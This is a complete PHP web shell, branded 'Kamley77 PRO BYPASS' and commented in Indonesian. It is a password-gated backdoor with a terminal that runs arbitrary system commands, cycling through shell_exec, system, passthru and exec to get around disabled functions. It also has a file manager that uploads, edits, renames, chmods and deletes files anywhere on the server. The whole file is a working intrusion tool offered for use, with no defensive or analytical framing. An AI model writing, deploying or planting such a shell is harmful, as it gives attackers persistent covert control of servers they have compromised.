<?php
session_start();

// Hash password bcrypt yang diberikan
$hash_password = '$2a$12$d7ctg9D7tAaUVOkjJ3kdJeagI2yCAuKoU475fW4.RWMJ9UrZ18pQ6';

// Logout handling
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Jika sudah login, langsung tampilkan script utama
if (isset($_SESSION['logged_in'])) {
    // ========================== SCRIPT UTAMA DIMULAI DI SINI ==========================
    $dir = isset($_GET['d']) ? str_replace('\\', '/', $_GET['d']) : str_replace('\\', '/', getcwd());
    if (!is_dir($dir)) $dir = str_replace('\\', '/', getcwd());
    chdir($dir);
    $real_path = str_replace('\\', '/', getcwd());

    echo "<body style='background-color: #1a1a1a; color: #ccc; font-family: monospace;'>";

    echo "<div style='text-align: center; background: #222; padding: 10px; border-bottom: 2px solid #0f0;'>";
    echo "<h1 style='color:#0f0; margin:0;'>Created by Kamley77 PRO BYPASS</h1>";

    // Breadcrumbs
    echo "<b>Path: </b>";
    $parts = explode('/', trim($real_path, '/'));
    $path_build = "";
    echo "<a href='?d=/' style='color:#0f0;'>/</a>";
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $path_build .= "/" . $part;
        echo "<a href='?d=$path_build' style='color:#0f0; text-decoration:none;'>$part</a> / ";
    }
    echo "<a href='?logout=true' style='float:right; color:#f00;'>Logout</a>"; // Tombol logout di pojok kanan
    echo "</div>";

    // --- TERMINAL ENGINE ---
    function bypass_exec($cmd) {
        $out = "";
        if (function_exists('shell_exec')) { $out = shell_exec($cmd . " 2>&1"); }
        elseif (function_exists('system')) { ob_start(); system($cmd . " 2>&1"); $out = ob_get_contents(); ob_end_clean(); }
        elseif (function_exists('passthru')) { ob_start(); passthru($cmd . " 2>&1"); $out = ob_get_contents(); ob_end_clean(); }
        elseif (function_exists('exec')) { exec($cmd . " 2>&1", $output); $out = implode("\n", $output); }
        return $out ? $out : "[!] Bypass Gagal: Semua fungsi eksekusi dilarang.";
    }

    // UI Terminal
    echo '<div style="background: #000; padding: 15px; border: 1px solid #333; margin: 10px 0;">';
    echo '<form method="POST">
            <span style="color: #0f0;">kamley77@bypass:~$</span> 
            <input type="text" name="cmd" autofocus style="background:transparent; border:none; color:#0f0; width:80%; outline:none;">
          </form>';
    if (isset($_POST['cmd'])) {
        echo "<pre style='color: #0f0; border-top: 1px solid #222; padding-top: 10px;'>" . htmlspecialchars(bypass_exec($_POST['cmd'])) . "</pre>";
    }
    echo '</div>';

    // --- FILE MANAGER ---
    if (isset($_POST['save_file'])) { @file_put_contents($_POST['filepath'], $_POST['content']); }
    if (isset($_POST['create_new'])) { 
        if ($_POST['type'] == 'file') { @file_put_contents($_POST['name'], ""); }
        else { @mkdir($_POST['name']); }
    }
    if (isset($_POST['rename_obj'])) { @rename($_POST['old_name'], $_POST['new_name']); header("Location: ?d=$real_path"); }
    if (isset($_POST['change_perm'])) { @chmod($_POST['obj_path'], octdec($_POST['perm_value'])); header("Location: ?d=$real_path"); }
    if (isset($_GET['delete'])) { $target = $_GET['delete']; is_dir($target) ? @rmdir($target) : @unlink($target); header("Location: ?d=$real_path"); }

    // Uploader
    if (isset($_FILES['upload_file'])) {
        if (@copy($_FILES['upload_file']['tmp_name'], $real_path . '/' . $_FILES['upload_file']['name'])) {
            echo "<script>alert('Upload Berhasil!'); window.location='?d=$real_path';</script>";
        } else {
            echo "<script>alert('Upload Gagal!');</script>";
        }
    }

    // Form buat File/Folder & Upload
    echo '<div style="padding: 10px; background: #222; margin-bottom: 10px; display: flex; gap: 20px; align-items: center;">
        <form method="POST">
            <b>Buat Baru:</b> <input type="text" name="name" placeholder="nama_file.txt">
            <select name="type"><option value="file">File</option><option value="dir">Folder</option></select>
            <input type="submit" name="create_new" value="Buat">
        </form>
        <div style="border-left: 1px solid #444; height: 20px;"></div>
        <form method="POST" enctype="multipart/form-data">
            <b>Upload:</b> <input type="file" name="upload_file">
            <input type="submit" value="Upload">
        </form>
    </div>';

    // Area Edit File
    if (isset($_GET['edit'])) {
        $file_to_edit = $_GET['edit'];
        $content = htmlspecialchars(@file_get_contents($file_to_edit));
        echo "<div style='padding: 15px; background: #333; border: 1px solid #0f0;'>
        <h3 style='margin-top:0;'>Editing: ".basename($file_to_edit)."</h3>
        <form method='POST'>
            <input type='hidden' name='filepath' value='$file_to_edit'>
            <textarea name='content' style='width:100%; height:300px; background:#111; color:#0f0; border:1px solid #444;'>$content</textarea><br><br>
            <input type='submit' name='save_file' value='Simpan Ke Server'> 
            <a href='?d=$real_path' style='color:red;'>[Tutup]</a>
        </form></div><br>";
    }

    // Tabel File/Folder
    echo "<table border='1' width='100%' style='border-collapse: collapse; background: #222;'>
    <tr style='background: #333; color: #0f0;'>
        <th>Nama (Hijau: Writable, Merah: No)</th>
        <th>Perms</th>
        <th>Aksi</th>
    </tr>";

    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file == "." || $file == "..") continue;
        $full_path = $real_path . '/' . $file;
        $is_dir = is_dir($full_path);
        $writable = is_writable($full_path);
        $color = $writable ? "#00ff00" : "#ff0000";
        $perms = substr(sprintf('%o', @fileperms($full_path)), -4);
        echo "<tr>
            <td style='padding: 5px;'>";
        if ($is_dir) {
            echo "<b><a href='?d=$full_path' style='color: $color;'>[$file]</a></b>";
        } else {
            echo "<span style='color: $color;'>$file</span>";
        }
        echo "</td>
            <td align='center'>
                <form method='POST' style='display:inline;'>
                    <input type='hidden' name='obj_path' value='$full_path'>
                    <input type='text' name='perm_value' value='$perms' size='4' style='background:transparent; color:#fff; border:1px solid #444; text-align:center;'>
                    <input type='submit' name='change_perm' value='Chmod' style='font-size:10px;'>
                </form>
            </td>
            <td align='center'>
                <a href='?d=$real_path&edit=$full_path' style='color:#0f0;'>Edit</a> | 
                <form method='POST' style='display:inline;'>
                    <input type='hidden' name='old_name' value='$full_path'>
                    <input type='text' name='new_name' placeholder='Rename' size='10' style='background:#111; color:#fff; border:1px solid #444;'>
                    <input type='submit' name='rename_obj' value='>>'>
                </form> | 
                <a href='?delete=$full_path' onclick=\"return confirm('Hapus?')\" style='color:red;'>Del</a>
            </td>
        </tr>";
    }
    echo "</table></body>";
    // ========================== SCRIPT UTAMA SELESAI ==========================
    exit;
}

// ========================== HALAMAN LOGIN ==========================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if (password_verify($_POST['password'], $hash_password)) {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        echo "<script>alert('Password salah!');</script>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Hacker PRO BYPASS</title>
<style>
body {
    background: #000;
    color: #ccc;
    font-family: monospace;
    margin: 0;
}
.login-box {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #111;
    border: 2px solid #0f0;
    padding: 40px;
    box-shadow: 0 0 20px #0f0;
    text-align: center;
}
h1 {
    color: #0f0;
    margin-bottom: 20px;
}
input[type=password] {
    background: transparent;
    border: 1px solid #0f0;
    padding: 10px;
    width: 200px;
    color: #0f0;
    font-family: monospace;
}
input[type=submit] {
    margin-top: 20px;
    padding: 10px 20px;
    background: #000;
    border: 1px solid #0f0;
    color: #0f0;
    cursor: pointer;
    font-family: monospace;
}
</style>
</head>
<body>
<div class="login-box">
<h1>HACKER LOGIN</h1>
<form method="POST">
<input type="password" name="password" placeholder="Password" autofocus>
<br>
<input type="submit" value="Login">
</form>
</div>
</body>
</html>
